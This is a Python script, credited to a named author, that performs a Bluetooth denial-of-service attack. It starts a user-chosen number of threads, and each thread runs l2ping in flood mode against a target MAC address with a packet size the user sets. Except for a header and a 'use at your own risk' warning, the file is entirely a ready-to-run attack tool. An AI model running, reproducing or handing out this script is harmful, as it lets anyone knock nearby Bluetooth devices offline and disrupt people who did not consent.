# Program name : Bluetooth DOS attack
# Programmer name : Bibhas Das
# Email : bibhasdas1205@gmail.compile
# Date : 18/7/2023

# Warning : Use it in your own risk.
#------------------------------------------------------------------------------------------
import os
import threading
import sys

def DOS(target_addr, packages_size):
	os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)
def main():
	if len(sys.argv)!=4:
		print("Enter ",sys.argv[0]," <bt_mac_address> <package_size> <no_threads>")
	else:
		target_addr = sys.argv[1]
		if len(target_addr) < 1:	
			print('[!] ERROR: Target addr is missing')
			exit(0)
		try:
			packages_size = int(sys.argv[2])
		except:
			print('[!] ERROR: Packages size must be an integer')
			exit(0)
		try:
			threads_count = int(sys.argv[3])
		except:
			print('[!] ERROR: Threads count must be an integer')
			exit(0)

		for i in range(0, threads_count):
			print('[*] Built thread no : ' + str(i + 1))
			threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()

		print('[*] Built all threads...')
		print('[*] Starting...')

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n[*] Aborted')
        exit(0)
    except Exception as e:
        print('[!] ERROR: ' + str(e))